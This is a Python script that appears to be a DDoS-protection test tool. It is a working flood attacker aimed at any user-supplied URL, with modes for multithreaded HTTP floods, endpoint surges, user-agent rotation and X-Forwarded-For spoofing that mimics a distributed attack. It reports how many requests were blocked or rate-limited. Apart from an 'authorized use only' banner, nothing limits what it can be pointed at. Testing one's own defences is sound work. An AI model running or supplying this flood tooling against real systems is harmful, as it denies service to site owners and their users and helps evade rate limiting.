"""DDoS Attack Simulation Tools (AUTHORIZED USE ONLY)"""
import requests
import time
import argparse
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

class AttackSimulator:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.results = {'total_requests': 0, 'successful': 0, 'blocked': 0, 'rate_limited': 0, 'errors': 0}
        self._lock = threading.Lock()
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1",
            "Bot/1.0 (Testing DDoS Protection)",
            "Scraper/2.1 (Behavioral Test)"
        ]

    def _reset_results(self):
        self.results = {'total_requests': 0, 'successful': 0, 'blocked': 0, 'rate_limited': 0, 'errors': 0}

    def http_flood(self, duration=30, rps=100, endpoint='/'):
        self._reset_results()
        self._run_attack("HTTP Flood", duration, rps, endpoint)

    def periodic_spike(self, duration=30, interval=2.0):
        self._reset_results()
        print(f"[*] Starting Periodic Spike Attack (Interval: {interval}s)")
        end_time = time.time() + duration
        while time.time() < end_time:
            self._send_request('GET', '/')
            time.sleep(interval)
        self._print_results("Periodic Spike")

    def endpoint_surge(self, duration=30, rps=100, target_endpoint='/api/data'):
        self._reset_results()
        print(f"[*] Starting Endpoint Surge on {target_endpoint}")
        self._run_attack("Endpoint Surge", duration, rps, target_endpoint)

    def ua_diversity_attack(self, duration=30, rps=10):
        self._reset_results()
        print(f"[*] Starting UA Diversity Attack")
        end_time = time.time() + duration
        while time.time() < end_time:
            import random
            ua = random.choice(self.user_agents)
            self._send_request('GET', '/', headers={'User-Agent': ua})
            time.sleep(1.0/rps)
        self._print_results("UA Diversity")

    def distributed_sim(self, duration=30, rps=100, num_ips=80):
        self._reset_results()
        print(f"[*] Starting Distributed Attack Simulation ({num_ips} IPs)")
        import random
        # Use TEST-NET-2 public documentation range so detector treats each source as external.
        ips = [f"198.51.100.{i}" for i in range(1, num_ips + 1)]
        
        end_time = time.time() + duration
        with ThreadPoolExecutor(max_workers=min(rps, 50)) as executor:
            while time.time() < end_time:
                ip = random.choice(ips)
                executor.submit(self._send_request, 'GET', '/', headers={'X-Forwarded-For': ip})
                time.sleep(1.0/rps)
        self._print_results("Distributed Simulation")

    def _run_attack(self, name, duration, rps, endpoint):
        print(f"\n[!] WARNING: AUTHORIZED USE ONLY")
        print(f"[*] Attack:   {name}")
        print(f"[*] Target:   {self.target_url}{endpoint}")
        print(f"[*] Rate:     {rps} req/s")
        print(f"[*] Duration: {duration}s")
        print(f"{'='*50}")

        end_time = time.time() + duration
        with ThreadPoolExecutor(max_workers=min(rps, 50)) as executor:
            while time.time() < end_time:
                remaining = end_time - time.time()
                if remaining <= 0:
                    break
                futures = [executor.submit(self._send_request, 'GET', endpoint) for _ in range(rps)]
                for f in as_completed(futures):
                    pass
                elapsed = duration - remaining
                print(f"\r[*] Elapsed: {int(elapsed)}s | Total: {self.results['total_requests']} | "
                      f"OK: {self.results['successful']} | Blocked: {self.results['blocked']}", end='', flush=True)
                time.sleep(1)
        print()
        self._print_results(name)

    def _send_request(self, method, endpoint, headers=None):
        try:
            full_headers = {'User-Agent': 'AttackSim/1.0'}
            if headers:
                full_headers.update(headers)
            response = requests.request(method=method, url=f"{self.target_url}{endpoint}", 
                                     headers=full_headers, timeout=5)
            with self._lock:
                self.results['total_requests'] += 1
                if response.status_code == 200:
                    self.results['successful'] += 1
                elif response.status_code == 403:
                    self.results['blocked'] += 1
                elif response.status_code == 429:
                    self.results['rate_limited'] += 1
        except requests.exceptions.RequestException:
            with self._lock:
                self.results['total_requests'] += 1
                self.results['errors'] += 1

    def _print_results(self, attack_type):
        r = self.results
        total = r['total_requests'] or 1
        print(f"\n{'='*50}")
        print(f" Results: {attack_type}")
        print(f"{'='*50}")
        print(f" Total Requests:  {r['total_requests']}")
        print(f" Successful:      {r['successful']} ({r['successful']/total*100:.1f}%)")
        print(f" Blocked (403):   {r['blocked']} ({r['blocked']/total*100:.1f}%)")
        print(f" Rate Limited:    {r['rate_limited']} ({r['rate_limited']/total*100:.1f}%)")
        print(f" Errors:          {r['errors']} ({r['errors']/total*100:.1f}%)")
        print(f"{'='*50}")
        mitigation_rate = (r['blocked'] + r['rate_limited']) / total * 100
        print(f" Mitigation Rate: {mitigation_rate:.1f}%")
        print(f"{'='*50}")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='DDoS Attack Simulator (AUTHORIZED USE ONLY)')
    parser.add_argument('--target', required=True, help='Target URL (e.g. http://localhost:80)')
    parser.add_argument('--type', default='http-flood', 
                        choices=['http-flood', 'periodic-spike', 'endpoint-surge', 'ua-diversity', 'distributed-sim'], 
                        help='Attack type')
    parser.add_argument('--duration', type=int, default=30, help='Duration in seconds')
    parser.add_argument('--rps', type=int, default=100, help='Requests per second')
    parser.add_argument('--interval', type=float, default=2.0, help='Interval for periodic-spike')
    parser.add_argument('--endpoint', default='/', help='Target endpoint')
    parser.add_argument('--ips', type=int, default=80, help='Number of IPs for distributed-sim')
    args = parser.parse_args()

    simulator = AttackSimulator(args.target)
    if args.type == 'http-flood':
        simulator.http_flood(duration=args.duration, rps=args.rps, endpoint=args.endpoint)
    elif args.type == 'periodic-spike':
        simulator.periodic_spike(duration=args.duration, interval=args.interval)
    elif args.type == 'endpoint-surge':
        simulator.endpoint_surge(duration=args.duration, rps=args.rps, target_endpoint=args.endpoint)
    elif args.type == 'ua-diversity':
        simulator.ua_diversity_attack(duration=args.duration, rps=args.rps)
    elif args.type == 'distributed-sim':
        simulator.distributed_sim(duration=args.duration, rps=args.rps, num_ips=args.ips)
